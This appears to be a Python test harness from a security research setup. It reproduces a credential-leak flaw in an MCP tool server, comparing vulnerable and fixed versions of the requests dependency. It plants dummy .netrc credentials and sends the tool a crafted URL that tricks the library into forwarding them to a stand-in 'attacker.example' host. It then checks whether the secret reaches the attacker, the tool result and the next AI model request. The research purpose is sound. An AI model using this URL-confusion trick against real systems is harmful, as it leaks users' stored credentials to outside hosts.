from __future__ import annotations
import argparse
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
sys.path.insert(0, '/opt/gt')
from shared_host_runner import evidence_rows, run_shared_host_case
SECRET = 'Basic UDRfMDI2X0xPR0lOOlA0XzAyNl9TRUNSRVQ='
BOUNDARY_PORT = 18080

class Boundary:

    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        boundary = self

        class Handler(BaseHTTPRequestHandler):

            def do_GET(self) -> None:
                headers = dict(self.headers)
                boundary.requests.append({'host': headers.get('Host', ''), 'path': self.path, 'headers': headers})
                body = f"""<html><title>P4-026 boundary</title><body>AUTH_LEAK={headers.get('Authorization', '')}</body></html>""".encode()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return
        self.server = ThreadingHTTPServer(('0.0.0.0', BOUNDARY_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

    def snapshot(self) -> dict[str, Any]:
        attacker = next((item for item in self.requests if item.get('host', '').startswith('attacker.example')), {})
        return {'boundary': 'container-local-netrc-credential-reflection-boundary', 'port': self.server.server_port, 'requests': list(self.requests), 'attacker_authorization': attacker.get('headers', {}).get('Authorization', '')}

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--spec', type=Path, required=True)
    parser.add_argument('--output', type=Path, required=True)
    parser.add_argument('--side', choices=('vulnerable', 'fixed'), required=True)
    parser.add_argument('--repetition', type=int, required=True)
    args = parser.parse_args()
    spec = json.loads(args.spec.read_text(encoding='utf-8'))
    boundary = Boundary()
    boundary.start()
    try:
        dep_root = '/opt/deps/vulnerable' if args.side == 'vulnerable' else '/opt/deps/fixed'
        port = boundary.server.server_port
        tool_args = {'url': f"""http://marker.example:@attacker.example:{port}/collect"""}
        netrc = Path('/tmp/gt-home/.netrc')
        netrc.parent.mkdir(parents=True, exist_ok=True)
        netrc.write_text('machine marker.example login P4_026_LOGIN password P4_026_SECRET\n', encoding='utf-8')
        netrc.chmod(384)
        env = {'PYTHONPATH': f"""{dep_root}:/workspace/source""", 'NETRC': str(netrc), 'HOME': '/tmp/gt-home', 'NO_PROXY': '*', 'no_proxy': '*', 'HTTP_PROXY': '', 'HTTPS_PROXY': '', 'ALL_PROXY': '', 'PYTHONIOENCODING': 'utf-8'}
        record = run_shared_host_case(run_id=f"""{spec['case_id']}-{args.side}-{args.repetition}""", case_id=spec['case_id'], revision=args.side, repetition=args.repetition, command=['python3', 'server.py'], cwd=Path('/workspace/source'), env=env, server_name=spec['repository_url'], tool_name=spec['mcp_path']['tool'], tool_arguments=tool_args, task=spec['experiment']['agent_task'], system_prompt='You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.', server_revision=f"""{spec['source_commit']}; requests=={spec['direct_runtime_dependency'][args.side + '_version']}""", timeout=float(spec['runner']['timeout_seconds']))
        snapshot = boundary.snapshot()
        record['external_boundary'] = snapshot
        serialized_tool = json.dumps(record.get('mcp', {}).get('normalized_result', {}), ensure_ascii=False)
        serialized_l4 = json.dumps(record.get('model', {}).get('next_request', {}), ensure_ascii=False)
        record['p4_probe'] = {'input_excludes_secret': SECRET not in json.dumps(tool_args, ensure_ascii=False), 'attacker_authorization': snapshot['attacker_authorization'], 'secret_in_tool_result': SECRET in serialized_tool, 'secret_in_l4': SECRET in serialized_l4, 'l4_is_actual_next_model_request': bool(record.get('model', {}).get('next_request'))}
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / 'host_record.json').write_text(json.dumps(record, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
        (args.output / 'evidence.jsonl').write_text(''.join((json.dumps(row, ensure_ascii=False) + '\n' for row in evidence_rows(record))), encoding='utf-8')
        (args.output / 'boundary_snapshot.json').write_text(json.dumps(snapshot, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
        valid = not record['quality']['invalid_run'] and all((value == 'observed' for value in record['evidence_levels'].values()))
        print(json.dumps({'status': 'OK' if valid else 'INVALID', 'output': str(args.output)}))
        return 0 if valid else 1
    finally:
        boundary.close()
if __name__ == '__main__':
    raise SystemExit(main())
